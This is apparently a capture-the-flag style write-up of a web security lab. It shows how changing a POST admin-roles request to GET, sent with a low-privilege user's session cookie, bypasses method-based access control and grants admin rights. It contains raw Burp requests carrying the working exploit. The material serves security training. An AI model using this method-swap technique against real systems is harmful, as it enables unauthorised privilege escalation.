*This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin. To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator.*

Logged in as admin first and navigated to the admin panel : 

![Screenshot 2024-04-30 at 4.06.47 PM](images/Screenshot%202024-04-30%20at%204.06.47%20PM.png)
Let's try capturing the request to upgrade a user to see what is passed: 

```Burp 
POST /admin-roles HTTP/2
Host: 0ae7004a0480cf4887d38a2c00d2005e.web-security-academy.net
Cookie: session=xjCpOIGkNqRjyYMF4dZVoYNt7vLltwED
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0ae7004a0480cf4887d38a2c00d2005e.web-security-academy.net
Referer: https://0ae7004a0480cf4887d38a2c00d2005e.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

username=wiener&action=upgrade

```

I opened a new tab and logged in as *wiener* to obtain the session value and pass that into the original request in the Repeater, changing the value the request to GET. 

```Burp 
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0ae7004a0480cf4887d38a2c00d2005e.web-security-academy.net
Cookie: session=5ue9JsMoN6zQf7xmBhG1LTbUgvSMY5vT
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0ae7004a0480cf4887d38a2c00d2005e.web-security-academy.net
Referer: https://0ae7004a0480cf4887d38a2c00d2005e.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```